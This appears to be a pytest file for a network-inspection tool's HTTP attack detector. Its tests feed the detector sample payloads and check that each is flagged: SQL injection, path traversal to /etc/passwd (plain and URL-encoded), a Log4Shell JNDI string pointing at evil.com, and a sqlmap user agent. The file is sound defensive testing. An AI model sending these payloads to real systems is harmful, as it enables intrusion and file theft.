"""Tests for HTTP deep inspection (URI attack patterns + scanner UAs)."""

from packetiq.detection import http_inspect
from packetiq.detection.models import EventType
from packetiq.extractor.data_extractor import ExtractionResult


def _req(path, ua="Mozilla/5.0", host="victim.local", method="GET"):
    return {"ts": 1.0, "src": "45.33.32.156", "dst": "10.0.0.5",
            "method": method, "host": host, "path": path, "ua": ua}


def test_sqli_detected():
    res = ExtractionResult()
    res.http_requests = [_req("/item?id=1' OR 1=1--")]
    ev = http_inspect.detect(res)
    assert any(e.evidence.get("attack_type") == "SQL injection" for e in ev)


def test_path_traversal_detected():
    res = ExtractionResult()
    res.http_requests = [_req("/download?file=../../../../etc/passwd")]
    ev = http_inspect.detect(res)
    assert any(e.evidence.get("attack_type") == "Path traversal" for e in ev)


def test_log4shell_detected():
    res = ExtractionResult()
    res.http_requests = [_req("/", host="${jndi:ldap://evil.com/a}")]
    ev = http_inspect.detect(res)
    assert any(e.evidence.get("attack_type") == "Log4Shell / JNDI" for e in ev)


def test_url_encoded_payload_decoded():
    res = ExtractionResult()
    res.http_requests = [_req("/p?x=%2e%2e%2f%2e%2e%2fetc%2fpasswd")]
    ev = http_inspect.detect(res)
    assert any(e.event_type == EventType.HTTP_ATTACK for e in ev)


def test_scanner_user_agent_flagged():
    res = ExtractionResult()
    res.http_requests = [_req("/", ua="sqlmap/1.7")]
    ev = http_inspect.detect(res)
    assert any(e.evidence.get("attack_type") == "suspicious_user_agent" for e in ev)


def test_benign_request_not_flagged():
    res = ExtractionResult()
    res.http_requests = [_req("/index.html?lang=en", ua="Mozilla/5.0 (Windows NT 10.0)")]
    assert http_inspect.detect(res) == []
